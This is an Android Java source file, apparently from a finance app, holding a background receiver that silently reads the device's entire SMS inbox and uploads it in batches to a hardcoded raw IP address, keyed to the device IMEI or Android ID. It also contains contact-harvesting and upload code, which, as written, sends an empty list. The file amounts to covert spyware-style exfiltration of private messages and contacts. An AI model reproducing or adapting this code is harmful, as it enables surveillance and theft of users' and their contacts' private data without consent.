package com.tst.hytonefinance.Background_Service;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.ServerError;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.tst.hytonefinance.Database.SMS_data;
import com.tst.hytonefinance.MainActivity;
import com.tst.hytonefinance.Models.SMS;
import com.tst.hytonefinance.R;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class sync_data extends BroadcastReceiver {
    private String Base_Url="http://3.135.51.200";
    private Context context;
    private SMS_data sms_data;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context=context;
        sms_data=new SMS_data(context);
        SMS_spliterator();
        contact_spliterator();
        Toast.makeText(context, "SMS_SYN"+ Calendar.getInstance().getTime().toString(), Toast.LENGTH_SHORT).show();

    }

    //------------------ Message List -------------------
    @SuppressLint("SimpleDateFormat")
    public ArrayList<SMS> readSMS() {
        ArrayList<SMS> Message_list = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        cursor.moveToFirst();

        for (int i = 0; !cursor.isLast(); i++) {
            SMS temp_data = new SMS();

            temp_data.setDate_time(cursor.getString(4));
            temp_data.setTitle(cursor.getString(0));
            temp_data.setMessage(cursor.getString(12));
            temp_data.setSender(cursor.getString(2));
            Message_list.add(temp_data);
            Boolean check_data_flag = sms_data.Insert_Subject_data(temp_data.getTitle(),temp_data.getSender(),temp_data.getMessage(),temp_data.getDate_time());
            if(!check_data_flag)
            {
                Toast.makeText(context, "Error", Toast.LENGTH_SHORT).show();
                break;
            }

            cursor.moveToNext();
        }


        Toast.makeText(context, "Done", Toast.LENGTH_SHORT).show();
        cursor.close();


        return Message_list;
    }

    private void SMS_spliterator() {
        ArrayList<SMS> SMS_List=readSMS();

        JSONArray SMS_list = new JSONArray();
        Log.e("SMS_size : ",String.valueOf(SMS_List.size()),null);
        int i;
        for (i=1;i<SMS_List.size();i++) {

            Log.e("SMS_Progress : ",(int)((i+1.0)/SMS_List.size()*100)+"%",null);
            JSONObject temp = new JSONObject();
            try {
                temp.put("tital", SMS_List.get(i-1).getTitle());
                temp.put("sender", SMS_List.get(i-1).getSender());
                temp.put("message", SMS_List.get(i-1).getMessage());
                temp.put("date_time", SMS_List.get(i-1).getDate_time());

                SMS_list.put(temp);
                if (i % 100 == 0) {
                    Log.e("Loop_contact : " + i,"SMS_list.toString()",null);
                    sync_list(SMS_list,Base_Url+"/api/v1/user/userMessage","message");
                    SMS_list = new JSONArray();
                }
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }

        }

        if (i % 100 != 0)
        {
            Log.e("Outer_Loop_contact : ","SMS_list.toString()",null);
            sync_list(SMS_list,Base_Url+"/api/v1/user/userMessage","message");
        }


    }


    //------------------ Contact List -------------------

    @SuppressLint("Range")
    private HashMap<String, String> getContactList() {
        HashMap<String, String> map = new HashMap<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        int index = 0;

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                index++;
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        map.put(name, phoneNo);
                    }
                    pCur.close();
                }
            }
        }


        if (cur != null) {
            cur.close();
        }
        return map;
    }

    private void contact_spliterator() {
        HashMap<String, String> map = new HashMap<>();
        JSONArray Contact_list = new JSONArray();
        Log.e("map_size : ",String.valueOf(map.size()),null);

        int i = 1;
        for (Map.Entry<String, String> e : map.entrySet()) {
            Log.e("Progress : ",(int)((i-1.0)/map.size()*100)+"%",null);
            JSONObject temp = new JSONObject();
            try {
                temp.put("name", e.getKey());
                temp.put("number", e.getValue());
                i++;

                Contact_list.put(temp);
                if (i % 500 == 0) {
                    Log.e("Loop_contact : ",Contact_list.toString(),null);
                    sync_list(Contact_list,Base_Url+"/api/v1/user/userContact","contact");
                    Contact_list = new JSONArray();
                }
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }

        }
        if (i % 500 != 0)
        {
            Log.e("Outer_Loop_contact : ",Contact_list.toString(),null);
            sync_list(Contact_list,Base_Url+"/api/v1/user/userContact","contact");
        }


    }

    //------------------ Sync Function List -------------------
    private void sync_list(JSONArray body_Array,String url,String Array_name) {
        RequestQueue requestQueue = Volley.newRequestQueue(context);
        requestQueue.start();


        try {
            JSONObject Details = new JSONObject();
            Details.put("user", getDeviceIMEI());
            Details.put(Array_name, body_Array);

            JsonObjectRequest jsObjRequest = new
                    JsonObjectRequest(Request.Method.POST,
                            url,
                            Details,
                            new Response.Listener<JSONObject>() {
                                @Override
                                public void onResponse(JSONObject response) {

                                    try {
                                        Log.e("API_Response", String.valueOf(response.getString("status").equals("sucecss")), null);

                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                        Log.e("Request_response_catch", e.getMessage(), null);
                                    }
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {

                                    NetworkResponse response = error.networkResponse;
                                    if (error instanceof ServerError && response != null) {
                                        String res = null;
                                        try {
                                            res = new String(response.data,
                                                    HttpHeaderParser.parseCharset(response.headers, "utf-8"));
                                            Log.e("API_Response_Error 1", res.toString(), null);
                                        } catch (UnsupportedEncodingException e) {
                                            e.printStackTrace();
                                        }
                                        // Now you can use any deserializer to make sense of data
                                    }
                                    Log.e("API_Response_Error", error.getMessage(), null);
                                }
                            }) {
                        @Override
                        public Map<String, String> getHeaders() throws AuthFailureError {
                            HashMap<String, String> headers = new HashMap<String, String>();
                            headers.put("Content-Type", "application/json; charset=utf-8");
                            return headers;
                        }
                    };

            requestQueue.add(jsObjRequest);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }


    @SuppressLint("MissingPermission")
    public String getDeviceIMEI() {
        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            TelephonyManager mTelephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
            if (mTelephony.getDeviceId() != null) {
                deviceId = mTelephony.getDeviceId();
            } else {
                deviceId = Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;
    }

}
